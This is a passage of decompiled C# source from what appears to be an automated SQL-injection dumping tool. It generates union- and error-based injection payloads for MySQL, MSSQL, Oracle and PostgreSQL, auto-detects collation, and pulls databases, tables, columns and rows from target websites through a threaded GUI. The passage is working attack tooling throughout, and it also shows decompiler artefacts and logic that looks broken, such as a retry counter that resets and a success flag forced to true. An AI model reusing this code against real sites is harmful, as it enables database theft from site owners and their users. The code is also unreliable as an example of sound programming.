                                        int percentProgress = (int)Math.Round(Math.Round((double)(100 * (m + 1)) / (double)t.AfectedRows));
                                        this.bckWorker.ReportProgress(percentProgress, "");
                                        switch (this.__TypeGUI)
                                        {
                                            case enTypeGUI.DataBases:
                                                {
                                                    Schema arg_5D1_1 = Schema.DATABASES;
                                                    string arg_5D1_2 = t.DataBase;
                                                    string arg_5D1_3 = t.Table;
                                                    List<string> arg_5D1_4 = null;
                                                    int arg_5D1_5 = m;
                                                    int arg_5D1_6 = 1;
                                                    string arg_5D1_7 = text;
                                                    string arg_5D1_8 = text2;
                                                    HttpResponse httpResponse2 = null;
                                                    list2 = this.SQLDump(arg_5D1_1, arg_5D1_2, arg_5D1_3, arg_5D1_4, arg_5D1_5, arg_5D1_6, arg_5D1_7, arg_5D1_8, ref value, ref httpResponse2, null, -1);
                                                    break;
                                                }
                                            case enTypeGUI.Tables:
                                                {
                                                    Schema arg_5F9_1 = Schema.TABLES;
                                                    string arg_5F9_2 = t.DataBase;
                                                    string arg_5F9_3 = t.Table;
                                                    List<string> arg_5F9_4 = null;
                                                    int arg_5F9_5 = m;
                                                    int arg_5F9_6 = 1;
                                                    string arg_5F9_7 = text;
                                                    string arg_5F9_8 = text2;
                                                    HttpResponse httpResponse2 = null;
                                                    list2 = this.SQLDump(arg_5F9_1, arg_5F9_2, arg_5F9_3, arg_5F9_4, arg_5F9_5, arg_5F9_6, arg_5F9_7, arg_5F9_8, ref value, ref httpResponse2, null, -1);
                                                    break;
                                                }
                                            case enTypeGUI.Columns:
                                                {
                                                    Schema arg_621_1 = Schema.COLUMNS;
                                                    string arg_621_2 = t.DataBase;
                                                    string arg_621_3 = t.Table;
                                                    List<string> arg_621_4 = null;
                                                    int arg_621_5 = m;
                                                    int arg_621_6 = 1;
                                                    string arg_621_7 = text;
                                                    string arg_621_8 = text2;
                                                    HttpResponse httpResponse2 = null;
                                                    list2 = this.SQLDump(arg_621_1, arg_621_2, arg_621_3, arg_621_4, arg_621_5, arg_621_6, arg_621_7, arg_621_8, ref value, ref httpResponse2, null, -1);
                                                    break;
                                                }
                                        }
                                        if (list2.Count == 0)
                                        {
                                            WorkerResult _WorkerResult2 = this.__WorkerResult;
                                            lock (_WorkerResult2)
                                            {
                                                int arg_844_0 = num4;
                                                int num6 = t.AfectedRows - 1;
                                                for (int n = arg_844_0; n <= num6; n++)
                                                {
                                                    this.__WorkerResult.IndexFailed.Add(n);
                                                }
                                                break;
                                            }
                                        }
                                        else
                                        {
                                            try
                                            {
                                                List<string>.Enumerator enumerator3 = list2.GetEnumerator();
                                                while (enumerator3.MoveNext())
                                                {
                                                    string current2 = enumerator3.Current;
                                                    switch (this.__TypeGUI)
                                                    {
                                                        case enTypeGUI.DataBases:
                                                            this.AddDataBase(current2);
                                                            this.UpDateStatus(string.Concat(new string[]
											                {
												                "[",
												                Strings.FormatNumber(m + 1, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault),
												                "/",
												                Strings.FormatNumber(t.AfectedRows, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault),
												                "] Dumper thread, loading please wait.. dumping missing databases.."
											                }));
                                                            break;
                                                        case enTypeGUI.Tables:
                                                            this.AddTable(t.DataBase, current2);
                                                            this.UpDateStatus(string.Concat(new string[]
											                {
												                "[",
												                Strings.FormatNumber(m + 1, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault),
												                "/",
												                Strings.FormatNumber(t.AfectedRows, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault),
												                "] Dumper thread, loading please wait.. dumping missing tables.."
											                }));
                                                            break;
                                                        case enTypeGUI.Columns:
                                                            this.AddColumn(t.DataBase, t.Table, current2);
                                                            this.UpDateStatus(string.Concat(new string[]
											                {
												                "[",
												                Strings.FormatNumber(m + 1, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault),
												                "/",
												                Strings.FormatNumber(t.AfectedRows, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault),
												                "] Dumper thread, loading please wait.. dumping missing columns.."
											                }));
                                                            break;
                                                    }
                                                    int num7 = 0;
                                                    num7++;
                                                    WorkerResult _WorkerResult = this.__WorkerResult;
                                                    _WorkerResult.RowsAdded++;
                                                }
                                            }
                                            finally
                                            {
                                            }
                                            if (!this.WorkedRequestStop())
                                            {
                                                if (!this.WorkedRequestRetryExceeded(0))
                                                {
                                                    m++;
                                                    continue;
                                                }
                                                value = "retry limit exceeded";
                                                break;
                                            }
                                        }
                                        value = "canceled by user, ";
                                    IL_882:
                                        num4 = t.AfectedRows;
                                        goto IL_889;
                                    }
                                    //goto IL_882;
                                    num4 = t.AfectedRows;
                                    goto IL_889;
                                }
                            IL_889:
                                switch (this.__TypeGUI)
                                {
                                    case enTypeGUI.DataBases:
                                        value = "DataBases loaded successfully (" + Conversions.ToString(num4) + ")";
                                        break;
                                    case enTypeGUI.Tables:
                                        value = "Tables loaded successfully (" + Conversions.ToString(num4) + ")";
                                        break;
                                    case enTypeGUI.Columns:
                                        value = "Columns loaded successfully (" + Conversions.ToString(num4) + ")";
                                        break;
                                    default:
                                        Interaction.MsgBox("FIX ME ", MsgBoxStyle.OkOnly, null);
                                        break;
                                }
                                break;
                        }
                    }
                }
                catch (Exception expr_8FC)
                {
                    ProjectData.SetProjectError(expr_8FC);
                    Exception ex = expr_8FC;
                    value = "Row Index: " + Conversions.ToString(t.X) + " Error: " + ex.ToString();
                    bool flag2 = false;
                    ProjectData.ClearProjectError();
                }
                finally
                {
                    try
                    {
                        bool flag2 = false;
                        if (flag2)
                        {
                            this.__WorkerResult.ThreadSuccess.Add(t.IndexJob, value);
                        }
                        else
                        {
                            this.__WorkerResult.ThreadFailed.Add(t.IndexJob, value);
                            if (Conversions.ToBoolean(Operators.OrObject(Operators.AndObject(Operators.NotObject(this.GetObjectValue(this.chkAllInOneRequest)), this.__SQLType == Types.MySQL_No_Error), this.__SQLType != Types.MySQL_No_Error)))
                            {
                                WorkerResult _WorkerResult3 = this.__WorkerResult;
                                lock (_WorkerResult3)
                                {
                                    this.__WorkerResult.IndexFailed.Add(t.IndexJob);
                                }
                            }
                        }
                        this.__ThreadPool.Close(t.Thread);
                    }
                    catch (Exception expr_9F4)
                    {
                        ProjectData.SetProjectError(expr_9F4);
                        ProjectData.ClearProjectError();
                    }
                }
            }
        }

        private void BuildTraject()
        {
            this.__Traject = this.__URL;
            this.__TrajectOneT = "";
            this.__TrajectTotal = 0;
            int arg_2D_0 = 0;
            checked
            {
                int num = this.__URL.Length - 4;
                for (int i = arg_2D_0; i <= num; i++)
                {
                    string text = this.__URL.Substring(i, 3);
                    if (text.Equals("[t]"))
                    {
                        if (this.__TrajectTotal > 0)
                        {
                            text = this.__Traject;
                            text = text.Remove(i, 3);
                            text = text.Insert(i, "_|_");
                            if (string.IsNullOrEmpty(this.__TrajectOneT))
                            {
                                this.__TrajectOneT = text;
                                this.__TrajectOneT = this.__TrajectOneT.Replace("[t]", "0");
                                this.__TrajectOneT = this.__TrajectOneT.Replace("_|_", "[t]");
                            }
                            text = text.Replace("_|_", "[t" + Conversions.ToString(this.__TrajectTotal));
                            this.__Traject = text;
                        }
                        this.__TrajectTotal++;
                    }
                }
                if (string.IsNullOrEmpty(this.__TrajectOneT))
                {
                    this.__TrajectOneT = this.__URL;
                }
            }
        }
        private string BuildTraject(Schema oSchema, string sDataBase, string sTable, List<string> lColumns, int limitX, int limitY, string sWhere, string sOrder, ref string sResult, DumpThread t = null, int iMSQLErrCIndex = -1)
        {
            string text = "[t]";
            bool bIFNULL = Conversions.ToBoolean(this.GetObjectValue(this.chkDumpIFNULL));
            MySQLErrorType oType = new MySQLErrorType();
            OracleErrorType bError = new OracleErrorType();
            if (this.__SQLType == Types.MySQL_With_Error)
            {
                bool flag = true;
                if (Operators.ConditionalCompareObjectEqual(true, this.GetObjectValue(this.rdbMySQLErrorType1), false))
                {
                    oType = MySQLErrorType.DuplicateEntry;
                }
                else if (Operators.ConditionalCompareObjectEqual(flag, this.GetObjectValue(this.rdbMySQLErrorType2), false))
                {
                    oType = MySQLErrorType.ExtractValue;
                }
                else if (Operators.ConditionalCompareObjectEqual(flag, this.GetObjectValue(this.rdbMySQLErrorType3), false))
                {
                    oType = MySQLErrorType.UpdateXML;
                }
            }
            else if (this.__SQLType == Types.Oracle_With_Error)
            {
                bool flag2 = true;
                if (true == (this.__SQLType == Types.Oracle_No_Error))
                {
                    bError = OracleErrorType.NONE;
                }
                else if (Operators.ConditionalCompareObjectEqual(flag2, this.GetObjectValue(this.rdbOracleErrorType1), false))
                {
                    bError = OracleErrorType.GET_HOST_ADDRESS;
                }
                else if (Operators.ConditionalCompareObjectEqual(flag2, this.GetObjectValue(this.rdbOracleErrorType2), false))
                {
                    bError = OracleErrorType.DRITHSX_SN;
                }
                else if (Operators.ConditionalCompareObjectEqual(flag2, this.GetObjectValue(this.rdbOracleErrorType3), false))
                {
                    bError = OracleErrorType.GETMAPPINGXPATH;
                }
            }
            checked
            {
                switch (this.__SQLType)
                {
                    case Types.MySQL_No_Error:
                        switch (oSchema)
                        {
                            case Schema.INFO:
                                {
                                    bool bHexEncoded = false;
                                    text = MySQLNoError.Info(text, this.GetMySQLCollaction(), bHexEncoded, lColumns, "");
                                    bHexEncoded = Conversions.ToBoolean(this.GetObjectValue(this.chkDumpEncodedHex));
                                    break;
                                }
                            case Schema.DATABASES:
                                {
                                    bool bHexEncoded = false;
                                    text = MySQLNoError.DataBases(text, this.GetMySQLCollaction(), bHexEncoded, false, sWhere, sOrder, "", limitX, limitY);
                                    break;
                                }
                            case Schema.TABLES:
                                text = MySQLNoError.Tables(text, this.GetMySQLCollaction(), sDataBase, sWhere, sOrder, "", limitX, limitY);
                                break;
                            case Schema.COLUMNS:
                                text = MySQLNoError.Columns(text, this.GetMySQLCollaction(), sDataBase, sTable, false, sWhere, sOrder, "", limitX, limitY);
                                break;
                            case Schema.ROWS:
                                {
                                    bool bHexEncoded = false;
                                    if (this.DumpWithVariousT())
                                    {
                                        text = this.__Traject;
                                        int arg_219_0 = 0;
                                        int num = this.__TrajectTotal - 1;
                                        for (int i = arg_219_0; i <= num; i++)
                                        {
                                            string text2 = "[t]";
                                            if (this.__TypeGUI != enTypeGUI.CustomData)
                                            {
                                                text2 = MySQLNoError.Dump(text2, this.GetMySQLCollaction(), bHexEncoded, bIFNULL, sDataBase, sTable, lColumns, this.__TrajectTotal * limitX + i, limitY, sWhere, sOrder, "", "");
                                            }
                                            else
                                            {
                                                text2 = MySQLNoError.Dump(text2, this.GetMySQLCollaction(), bHexEncoded, bIFNULL, "", "", lColumns, this.__TrajectTotal * limitX + i, limitY, "", "", "", this.__SchemaDump.Item(0).Query);
                                            }
                                            if (i == 0)
                                            {
                                                text = text.Replace("[t]", text2);
                                            }
                                            else
                                            {
                                                text = text.Replace("[t" + Conversions.ToString(i), text2);
                                            }
                                        }
                                    }
                                    else if (this.__TypeGUI != enTypeGUI.CustomData)
                                    {
                                        text = MySQLNoError.Dump(text, this.GetMySQLCollaction(), bHexEncoded, bIFNULL, sDataBase, sTable, lColumns, limitX, limitY, sWhere, sOrder, "", "");
                                    }
                                    else
                                    {
                                        text = MySQLNoError.Dump(text, this.GetMySQLCollaction(), bHexEncoded, bIFNULL, "", "", lColumns, limitX, limitY, "", "", "", this.__SchemaDump.Item(0).Query);
                                    }
                                    bHexEncoded = Conversions.ToBoolean(this.GetObjectValue(this.chkDumpEncodedHex));
                                    break;
                                }
                        }
                        break;
                    case Types.MySQL_With_Error:
                        switch (oSchema)
                        {
                            case Schema.INFO:
                                {
                                    text = MySQLWithError.Info(text, this.GetMySQLCollaction(), oType, lColumns, "");
                                    bool bHexEncoded = Conversions.ToBoolean(this.GetObjectValue(this.chkDumpEncodedHex));
                                    break;
                                }
                            case Schema.DATABASES:
                                text = MySQLWithError.DataBases(text, this.GetMySQLCollaction(), oType, false, sWhere, sOrder, "", limitX, limitY);
                                break;
                            case Schema.TABLES:
                                text = MySQLWithError.Tables(text, this.GetMySQLCollaction(), oType, sDataBase, sWhere, sOrder, "", limitX, limitY);
                                break;
                            case Schema.COLUMNS:
                                text = MySQLWithError.Columns(text, this.GetMySQLCollaction(), oType, sDataBase, sTable, false, sWhere, sOrder, "", limitX, limitY);
                                break;
                            case Schema.ROWS:
                                {
                                    if (this.__TypeGUI != enTypeGUI.CustomData)
                                    {
                                        text = MySQLWithError.Dump(text, this.GetMySQLCollaction(), oType, bIFNULL, sDataBase, sTable, lColumns, limitX, limitY, "", sWhere, sOrder, "");
                                    }
                                    else
                                    {
                                        text = MySQLWithError.Dump(text, this.GetMySQLCollaction(), oType, bIFNULL, "", "", lColumns, limitX, limitY, "", "", "", this.__SchemaDump.Item(0).Query);
                                    }
                                    bool bHexEncoded = Conversions.ToBoolean(this.GetObjectValue(this.chkDumpEncodedHex));
                                    break;
                                }
                        }
                        break;
                    case Types.MSSQL_No_Error:
                    case Types.MSSQL_With_Error:
                        {
                            bool bCollateLatin = Conversions.ToBoolean(this.GetObjectValue(this.chkMSSQL_Latin1));
                            string sCastType = Conversions.ToString(Interaction.IIf(Conversions.ToBoolean(this.GetObjectValue(this.chkMSSQLCastAsChar)), RuntimeHelpers.GetObjectValue(this.GetObjectValue(this.cmbMSSQLCast)), ""));
                            InjectionType oError = new InjectionType();
                            switch (this.__SQLType)
                            {
                                case Types.MSSQL_No_Error:
                                    oError = InjectionType.Union;
                                    break;
                                case Types.MSSQL_With_Error:
                                    oError = InjectionType.Error;
                                    break;
                            }
                            switch (oSchema)
                            {
                                case Schema.INFO:
                                    text = MSSQL.Info(text, oError, bCollateLatin, lColumns, sCastType, "");
                                    break;
                                case Schema.DATABASES:
                                    text = MSSQL.DataBases(text, oError, false, sCastType, bCollateLatin, limitX, t.AfectedRows, sWhere, sOrder, "");
                                    break;
                                case Schema.TABLES:
                                    text = MSSQL.Tables(text, sDataBase, oError, sCastType, bCollateLatin, limitX, t.AfectedRows, sWhere, sOrder, "");
                                    break;
                                case Schema.COLUMNS:
                                    text = MSSQL.Columns(text, sDataBase, sTable, oError, sCastType, bCollateLatin, limitX, t.AfectedRows, sWhere, sOrder, "");
                                    break;
                                case Schema.ROWS:
                                    if (this.DumpWithVariousT() && this.__SQLType == Types.MSSQL_No_Error)
                                    {
                                        text = this.__Traject;
                                        int arg_5FD_0 = 0;
                                        int num2 = this.__TrajectTotal - 1;
                                        for (int j = arg_5FD_0; j <= num2; j++)
                                        {
                                            string text3 = "[t]";
                                            if (this.__TypeGUI != enTypeGUI.CustomData)
                                            {
                                                if (this.CurrentDataBase.Equals(sDataBase))
                                                {
                                                    text3 = MSSQL.Dump(text3, "", sTable, lColumns, bIFNULL, oError, sCastType, bCollateLatin, this.__TrajectTotal * limitX + j, t.AfectedRows, sWhere, sOrder, "", "", iMSQLErrCIndex);
                                                }
                                                else
                                                {
                                                    text3 = MSSQL.Dump(text3, sDataBase, sTable, lColumns, bIFNULL, oError, sCastType, bCollateLatin, this.__TrajectTotal * limitX + j, t.AfectedRows, sWhere, sOrder, "", "", iMSQLErrCIndex);
                                                }
                                            }
                                            else
                                            {
                                                text3 = MSSQL.Dump(text3, "", "", lColumns, bIFNULL, oError, sCastType, bCollateLatin, this.__TrajectTotal * limitX + j, t.AfectedRows, sWhere, sOrder, "", this.__SchemaDump.Item(0).Query, -1);
                                            }
                                            if (j == 0)
                                            {
                                                text = text.Replace("[t]", text3);
                                            }
                                            else
                                            {
                                                text = text.Replace("[t" + Conversions.ToString(j), text3);
                                            }
                                        }
                                    }
                                    else if (this.__TypeGUI != enTypeGUI.CustomData)
                                    {
                                        if (this.CurrentDataBase.Equals(sDataBase))
                                        {
                                            text = MSSQL.Dump(text, "", sTable, lColumns, bIFNULL, oError, sCastType, bCollateLatin, limitX, t.AfectedRows, sWhere, sOrder, "", "", iMSQLErrCIndex);
                                        }
                                        else
                                        {
                                            text = MSSQL.Dump(text, sDataBase, sTable, lColumns, bIFNULL, oError, sCastType, bCollateLatin, limitX, t.AfectedRows, sWhere, sOrder, "", "", iMSQLErrCIndex);
                                        }
                                    }
                                    else
                                    {
                                        text = MSSQL.Dump(text, "", "", lColumns, bIFNULL, oError, sCastType, bCollateLatin, limitX, t.AfectedRows, sWhere, sOrder, "", this.__SchemaDump.Item(0).Query, -1);
                                    }
                                    break;
                            }
                            break;
                        }
                    case Types.Oracle_No_Error:
                    case Types.Oracle_With_Error:
                        {
                            bool bCastAsChar = Conversions.ToBoolean(this.GetObjectValue(this.chkOracleCastAsChar));
                            InjectionType oMethod = new InjectionType();
                            switch (this.__SQLType)
                            {
                                case Types.Oracle_No_Error:
                                    oMethod = InjectionType.Union;
                                    break;
                                case Types.Oracle_With_Error:
                                    oMethod = InjectionType.Error;
                                    break;
                            }
                            switch (oSchema)
                            {
                                case Schema.INFO:
                                    text = Oracle.Info(text, oMethod, bError, lColumns, bCastAsChar, "");
                                    break;
                                case Schema.DATABASES:
                                    {
                                        List<string> dBS = this.GetDBS();
                                        text = Oracle.DataBases(text, oMethod, (MySQLErrorType)bError, bCastAsChar, false, sWhere, sOrder, "", dBS);
                                        break;
                                    }
                                case Schema.TABLES:
                                    text = Oracle.Tables(text, oMethod, (MySQLErrorType)bError, sDataBase, bCastAsChar, limitX, sWhere, sOrder, "");
                                    break;
                                case Schema.COLUMNS:
                                    text = Oracle.Columns(text, oMethod, (MySQLErrorType)bError, sDataBase, sTable, bCastAsChar, limitX, sWhere, sOrder, "");
                                    break;
                                case Schema.ROWS:
                                    {
                                        bool flag3 = true;
                                        OracleTopN oTopN = new OracleTopN();
                                        if (Operators.ConditionalCompareObjectEqual(true, this.GetObjectValue(this.rdbOracleTopN_1), false))
                                        {
                                            oTopN = OracleTopN.ROWNUM;
                                        }
                                        else if (Operators.ConditionalCompareObjectEqual(flag3, this.GetObjectValue(this.rdbOracleTopN_2), false))
                                        {
                                            oTopN = OracleTopN.RANK;
                                        }
                                        else if (Operators.ConditionalCompareObjectEqual(flag3, this.GetObjectValue(this.rdbOracleTopN_3), false))
                                        {
                                            oTopN = OracleTopN.DENSE_RANK;
                                        }
                                        if (this.DumpWithVariousT() && this.__SQLType == Types.Oracle_No_Error)
                                        {
                                            text = this.__Traject;
                                            int arg_954_0 = 0;
                                            int num3 = this.__TrajectTotal - 1;
                                            for (int k = arg_954_0; k <= num3; k++)
                                            {
                                                string text4 = "[t]";
                                                if (this.__TypeGUI != enTypeGUI.CustomData)
                                                {
                                                    text4 = Oracle.Dump(text4, oMethod, (MySQLErrorType)bError, sDataBase, sTable, lColumns, bCastAsChar, oTopN, this.__TrajectTotal * limitX + k, sWhere, sOrder, "", "");
                                                }
                                                else
                                                {
                                                    text4 = Oracle.Dump(text4, oMethod, (MySQLErrorType)bError, "", "", lColumns, bCastAsChar, oTopN, this.__TrajectTotal * limitX + k, sWhere, sOrder, "", this.__SchemaDump.Item(0).Query);
                                                }
                                                if (k == 0)
                                                {
                                                    text = text.Replace("[t]", text4);
                                                }
                                                else
                                                {
                                                    text = text.Replace("[t" + Conversions.ToString(k), text4);
                                                }
                                            }
                                        }
                                        else if (this.__TypeGUI != enTypeGUI.CustomData)
                                        {
                                            text = Oracle.Dump(text, oMethod, (MySQLErrorType)bError, sDataBase, sTable, lColumns, bCastAsChar, oTopN, limitX, sWhere, sOrder, "", "");
                                        }
                                        else
                                        {
                                            text = Oracle.Dump(text, oMethod, (MySQLErrorType)bError, "", "", lColumns, bCastAsChar, oTopN, limitX, sWhere, sOrder, "", this.__SchemaDump.Item(0).Query);
                                        }
                                        break;
                                    }
                            }
                            break;
                        }
                    case Types.PostgreSQL_No_Error:
                    case Types.PostgreSQL_With_Error:
                        {
                            PostgreSQLErrorType bError2 = new PostgreSQLErrorType();
                            InjectionType oMethod2 = new InjectionType();
                            switch (this.__SQLType)
                            {
                                case Types.PostgreSQL_No_Error:
                                    bError2 = PostgreSQLErrorType.NONE;
                                    break;
                                case Types.PostgreSQL_With_Error:
                                    bError2 = PostgreSQLErrorType.CAST_INT;
                                    oMethod2 = InjectionType.Error;
                                    break;
                            }
                            switch (oSchema)
                            {
                                case Schema.INFO:
                                    text = PostgreSQL.Info(text, oMethod2, bError2, lColumns, "");
                                    break;
                                case Schema.DATABASES:
                                    text = PostgreSQL.DataBases(text, oMethod2, bError2, false, limitX, sWhere, sOrder, "");
                                    break;
                                case Schema.TABLES:
                                    text = PostgreSQL.Tables(text, oMethod2, sDataBase, bError2, limitX, sWhere, sOrder, "");
                                    break;
                                case Schema.COLUMNS:
                                    text = PostgreSQL.Columns(text, oMethod2, sDataBase, sTable, bError2, limitX, sWhere, sOrder, "");
                                    break;
                                case Schema.ROWS:
                                    if (this.DumpWithVariousT() && this.__SQLType == Types.PostgreSQL_No_Error)
                                    {
                                        text = this.__Traject;
                                        int arg_B78_0 = 0;
                                        int num4 = this.__TrajectTotal - 1;
                                        for (int l = arg_B78_0; l <= num4; l++)
                                        {
                                            string text5 = "[t]";
                                            if (this.__TypeGUI != enTypeGUI.CustomData)
                                            {
                                                text5 = PostgreSQL.Dump(text5, oMethod2, sDataBase, sTable, lColumns, bError2, this.__TrajectTotal * limitX + l, sWhere, sOrder, "", "");
                                            }
                                            else
                                            {
                                                text5 = PostgreSQL.Dump(text5, oMethod2, "", "", lColumns, bError2, this.__TrajectTotal * limitX + l, sWhere, sOrder, "", "(" + this.__SchemaDump.Item(0).Query + ")");
                                            }
                                            if (l == 0)
                                            {
                                                text = text.Replace("[t]", text5);
                                            }
                                            else
                                            {
                                                text = text.Replace("[t" + Conversions.ToString(l), text5);
                                            }
                                        }
                                    }
                                    else if (this.__TypeGUI != enTypeGUI.CustomData)
                                    {
                                        text = PostgreSQL.Dump(text, oMethod2, sDataBase, sTable, lColumns, bError2, limitX, sWhere, sOrder, "", "");
                                    }
                                    else
                                    {
                                        text = PostgreSQL.Dump(text, oMethod2, "", "", lColumns, bError2, limitX, sWhere, sOrder, "", "(" + this.__SchemaDump.Item(0).Query + ")");
                                    }
                                    break;
                            }
                            break;
                        }
                }
                return text;
            }
        }

        private bool AutoSetupCollation(ref string sResult)
        {
            string text = "1025480056";
            string sTraject = "[t]";
            int num = Conversions.ToInteger(this.GetObjectValue(this.numMaxRetry));
            int millisecondsTimeout = Conversions.ToInteger(this.GetObjectValue(this.numSleep));
            string sCastType = Conversions.ToString(Interaction.IIf(Conversions.ToBoolean(this.GetObjectValue(this.chkMSSQLCastAsChar)), RuntimeHelpers.GetObjectValue(this.GetObjectValue(this.cmbMSSQLCast)), ""));
            if (Utls.TypeIsPostgreSQL(this.__SQLType))
            {
                return false;
            }
            checked
            {
                MySQLCollactions oCollaction = new MySQLCollactions();
                bool flag2 = false;
                OracleErrorType bError = new OracleErrorType();
                while (true)
                {
                    List<string> list = new List<string>();
                    bool flag = true;
                    int num2 = 0;
                    if (true == Utls.TypeIsMySQL(this.__SQLType))
                    {
                        list.Add(global::Globals.G_Utilities.ConvertTextToHex(text));
                        switch (num2)
                        {
                            case 0:
                                oCollaction = MySQLCollactions.None;
                                goto IL_10A;
                            case 1:
                                oCollaction = MySQLCollactions.UnHex;
                                goto IL_10A;
                            case 2:
                                oCollaction = MySQLCollactions.Binary;
                                goto IL_10A;
                            case 3:
                                oCollaction = MySQLCollactions.CastAsChar;
                                goto IL_10A;
                            case 4:
                                oCollaction = MySQLCollactions.Compress;
                                goto IL_10A;
                            case 5:
                                oCollaction = MySQLCollactions.ConvertUtf8;
                                goto IL_10A;
                            case 6:
                                oCollaction = MySQLCollactions.ConvertLatin1;
                                goto IL_10A;
                            case 7:
                                oCollaction = MySQLCollactions.Aes_descrypt;
                                goto IL_10A;
                        }
                        break;
                    }
                    if (flag == Utls.TypeIsMSSQL(this.__SQLType))
                    {
                        list.Add(global::Globals.G_Utilities.ConvertTextToHex(text));
                        switch (num2)
                        {
                            case 0:
                                flag2 = false;
                                goto IL_10A;
                            case 1:
                                flag2 = true;
                                goto IL_10A;
                        }
                        break;
                    }
                    if (flag == Utls.TypeIsOracle(this.__SQLType))
                    {
                        list.Add(global::Globals.G_Utilities.ConvertTextToSQLChar(text, false, "||", "chr"));
                        switch (num2)
                        {
                            case 0:
                                bError = OracleErrorType.GET_HOST_ADDRESS;
                                goto IL_10A;
                            case 1:
                                bError = OracleErrorType.DRITHSX_SN;
                                goto IL_10A;
                            case 2:
                                bError = OracleErrorType.GETMAPPINGXPATH;
                                goto IL_10A;
                        }
                        break;
                    }
                    return false;
                IL_10A:
                    switch (this.__SQLType)
                    {
                        case Types.MySQL_No_Error:
                            sTraject = MySQLNoError.Info(sTraject, oCollaction, false, list, "");
                            break;
                        case Types.MySQL_With_Error:
                            sTraject = MySQLWithError.Info(sTraject, oCollaction, MySQLErrorType.DuplicateEntry, list, "");
                            break;
                        case Types.MSSQL_No_Error:
                            sTraject = MSSQL.Info(sTraject, InjectionType.Union, flag2, list, sCastType, "");
                            break;
                        case Types.MSSQL_With_Error:
                            sTraject = MSSQL.Info(sTraject, InjectionType.Error, flag2, list, sCastType, "");
                            break;
                        case Types.Oracle_No_Error:
                            sTraject = Oracle.Info(sTraject, InjectionType.Union, OracleErrorType.NONE, list, true, "");
                            break;
                        case Types.Oracle_With_Error:
                            sTraject = Oracle.Info(sTraject, InjectionType.Error, bError, list, true, "");
                            break;
                    }
                    global::Globals.G_Tools.CheckSQLiStringOfuscation(ref sTraject);
                    HttpResponse httpResponse = null;
                    string text2 = this.LoadHTML(ref sTraject, ref sResult, ref httpResponse);
                    if (!string.IsNullOrEmpty(text2))
                    {
                        if (text2.Contains(text))
                        {
                            goto IL_2AD;
                        }
                        int num3 = 0;
                        Thread.Sleep(millisecondsTimeout);
                        num2++;
                    }
                    else
                    {
                        int num3 = 0;
                        num3++;
                        if (num3 >= num)
                        {
                            break;
                        }
                    }
                }
                goto IL_2AF;
            IL_2AD:
                bool flag3 = true;
            IL_2AF:
                flag3 = true;
                if (flag3)
                {
                    bool flag4 = true;
                    if (true == Utls.TypeIsMySQL(this.__SQLType))
                    {
                        switch (oCollaction)
                        {
                            case MySQLCollactions.None:
                                this.SetObjectValue(this.rdbMySQLCollactions0, true);
                                break;
                            case MySQLCollactions.UnHex:
                                this.SetObjectValue(this.rdbMySQLCollactions1, true);
                                break;
                            case MySQLCollactions.Binary:
                                this.SetObjectValue(this.rdbMySQLCollactions2, true);
                                break;
                            case MySQLCollactions.CastAsChar:
                                this.SetObjectValue(this.rdbMySQLCollactions3, true);
                                break;
                            case MySQLCollactions.Compress:
                                this.SetObjectValue(this.rdbMySQLCollactions4, true);
                                break;
                            case MySQLCollactions.ConvertUtf8:
                                this.SetObjectValue(this.rdbMySQLCollactions5, true);
                                break;
                            case MySQLCollactions.ConvertLatin1:
                                this.SetObjectValue(this.rdbMySQLCollactions6, true);
                                break;
                            case MySQLCollactions.Aes_descrypt:
                                this.SetObjectValue(this.rdbMySQLCollactions7, true);
                                break;
                        }
                    }
                    else if (flag4 == Utls.TypeIsMSSQL(this.__SQLType))
                    {
                        this.SetObjectValue(this.chkMSSQL_Latin1, flag2);
                        this.SetObjectValue(this.chkMSSQLCastAsChar, true);
                    }
                    else if (flag4 == Utls.TypeIsOracle(this.__SQLType))
                    {
                        switch (bError)
                        {
                            case OracleErrorType.GET_HOST_ADDRESS:
                                this.SetObjectValue(this.rdbOracleErrorType1, true);
                                break;
                            case OracleErrorType.DRITHSX_SN:
                                this.SetObjectValue(this.rdbOracleErrorType2, true);
                                break;
                            case OracleErrorType.GETMAPPINGXPATH:
                                this.SetObjectValue(this.rdbOracleErrorType3, true);
                                break;
                        }
                    }
                }
                return flag3;
            }
        }

        private bool DumpWithVariousT()
        {
            if ((this.__TypeGUI == enTypeGUI.Data | this.__TypeGUI == enTypeGUI.CustomData) && (this.__SQLType == Types.MySQL_No_Error | this.__SQLType == Types.MSSQL_No_Error | this.__SQLType == Types.Oracle_No_Error | this.__SQLType == Types.PostgreSQL_No_Error))
            {
                return Conversions.ToBoolean((!Conversions.ToBoolean(Operators.NotObject(this.GetObjectValue(this.chkDumpFieldByField))) || !Conversions.ToBoolean(this.__TrajectTotal > 1)) ? false : true);
            }
            bool result = false;
            return result;
        }

        private void bckWorker_DoWork(object sender, DoWorkEventArgs e)
        {
            string text = "";
            checked
            {
                /*try
                {*/
                    this.__AftectedRows = -1;
                    Conversions.ToBoolean(this.GetObjectValue(this.chkDumpFieldByField));
                    int num = Conversions.ToInteger(this.GetObjectValue(this.numLimitX));
                    int y = Conversions.ToInteger(this.GetObjectValue(this.numLimitY));
                    int num2 = Conversions.ToInteger(this.GetObjectValue(this.numLimitMax));
                    this.__ThreadPool = new global::ThreadPool(1);
                    bool flag = false;
                    if (Conversions.ToBoolean(Operators.AndObject(Operators.AndObject(Operators.AndObject(Operators.AndObject(this.GetObjectValue(this.chkAllInOneRequest), this.__SQLType == Types.MySQL_No_Error), this.__TypeGUI != enTypeGUI.Data), this.__TypeGUI != enTypeGUI.CustomData), this.__TypeGUI != enTypeGUI.Counter)))
                    {
                        flag = true;
                    }
                    this.BuildTraject();
                    if (num2 == 1 | this.__TypeGUI == enTypeGUI.Info | (this.__TypeGUI == enTypeGUI.Counter & (this.__Counter == enTypeCount.DBs | this.__Counter == enTypeCount.Tables | this.__Counter == enTypeCount.Columns | this.__Counter == enTypeCount.Rows)))
                    {
                        this.__AftectedRows = 1;
                    }
                    else
                    {
                        this.UpDateStatus("checking afected rows..");
                        if (this.__TypeGUI == enTypeGUI.CustomData)
                        {
                            if (!this.__SchemaDump.Item(0).Query.ToLower().Contains("[x]"))
                            {
                                this.__AftectedRows = 1;
                            }
                            else
                            {
                                this.__Counter = enTypeCount.Rows;
                            }
                        }
